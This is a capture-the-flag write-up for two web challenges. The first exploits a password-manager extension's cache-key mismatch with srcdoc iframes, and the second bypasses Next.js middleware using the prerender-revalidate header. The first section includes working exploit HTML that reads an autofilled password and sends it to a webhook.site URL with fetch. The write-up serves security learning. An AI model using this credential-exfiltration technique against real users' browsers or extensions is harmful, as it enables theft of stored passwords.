Writeups for infopass and Patchnotes CMS Revenge - 

## Infopass

The challenge's core functionality was an extension, which injected a save password button next to forms, and auto filled passwords matching the domain. The bot stores the flag as password on the main domain, and we have to somehow exfil it.

Let's see how it fetches and autofills - 
```js
if (loginInput && passwordInput) {
  chrome.runtime.sendMessage(
    { action: "getCredential", origin: getOrigin() },
    (cred) => {
      if (cred) {
        loginInput.value = cred.login;
        passwordInput.value = cred.password;
      }
    }
  );
}
```
It sends a message to background service worker. It adds origin in the message object.

In the background.js - 
```js
if (msg.action === "getCredential") {
    getCredential(sender).then(sendResponse);
    return true;
  }
```
We can see it never passes the message object to the handler. So getOrigin() function can be ignored.

Finally, this is the core handler - 
```js
async function getCredential(sender) {
  const url = new URL(sender.url);
  const path = url.origin + url.pathname;

  if (cache.has(path)) {
    return cache.get(path);
  }
  const key = await getKey();
  const passwords = await getPasswords();

  const item = passwords[sender.origin];
  if (!item) return null;
  ....
  ....
  const data = JSON.parse(decoder.decode(decrypted));
  cache.set(path, data);
  return data;
}
```

The creds are stored in local storage as well as in cache. It first checks if cache entry is present, otherwise loads from storage, and saves a copy in cache.

The key point is notice is that both use different keys for some reason. Cache presence check is done using sender.url and local storage check occurs using sender.origin. The sender object has both origin and url entries, but they are not the same. I haven't deep dived into source code, but I assume sender.origin is just window.origin, and sender.url is url from window.location.

To exfiltrate the flag, there had to be only 1 possible scenario, cache poisoning. We call getCredential such that url is something we can control and execute javascript in, and origin should be the main domain which the extension has password of. If we can do that, cache will be missed, and local storage copy will be stored in our cache key.

This difference can easily be created by using iframe with srcdoc attribute. srcdoc iframe inherits parent's origin. But the location of the frame is `about:srcdoc`. Now going back to the main domain, it echoes back our username. iframe with srcdoc are not affected by the strict CSP.

We force the bot to login using our supplied username which is - 
```html
<iframe srcdoc='<input name="username"><input type="password">'>
```
This will call getCredential with origin `https://infopass-web.challs2.infobahnc.tf` and url as `about:srcdoc`. 

There is no cache entry for this, so local storage is queried using origin, and stored into cache with key `nullsrcdoc`.

That's it, now we can just create a dummy iframe (with js) on any page with srcdoc, and extension will happily fill the creds, which we can read.

X.html - 
```html
<script>
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://infopass-web.challs2.infobahnc.tf/';
form.target = '_blank';
const usernameField = document.createElement('input');
usernameField.name = 'username';
usernameField.value = `<iframe srcdoc='<input name="username"><input type="password">'>`;
form.appendChild(usernameField);
const passwordField = document.createElement('input');
passwordField.type = 'password';
passwordField.name = 'password';
passwordField.value = 'abc';
form.appendChild(passwordField);
document.body.appendChild(form);
form.submit();
setTimeout(() => {
    window.open("Y.html")
}, 1000);

</script>
```

Y.html
```html
<iframe srcdoc='<input name="username"><input id="x" type="password">
<script>
function t(){
  fetch("https://webhook.site/...?a="+document.getElementById("x").value)
}
setTimeout(t, 3000)
</script>'></iframe>
```



## PatchNotes CMS - Revenge

This challenge was just painful hunting for a magical json file or a specific header, which might allow us to bypass the NextJS middleware. 

In [this file](https://github.com/vercel/next.js/blob/v14.2.33/packages/next/src/server/api-utils/index.ts), you will find that there exists a `PRERENDER_REVALIDATE_HEADER` which if passed correct value, you can bypass the middleware.

So we needed to pass a header `x-prerender-revalidate` set to the server's previewModeId. We can read previewModeId from `.next/prerender-manifest.json`

Then we can just do happy-dom rce based on this [page](https://github.com/capricorn86/happy-dom/security/advisories/GHSA-37j7-fg3j-429f).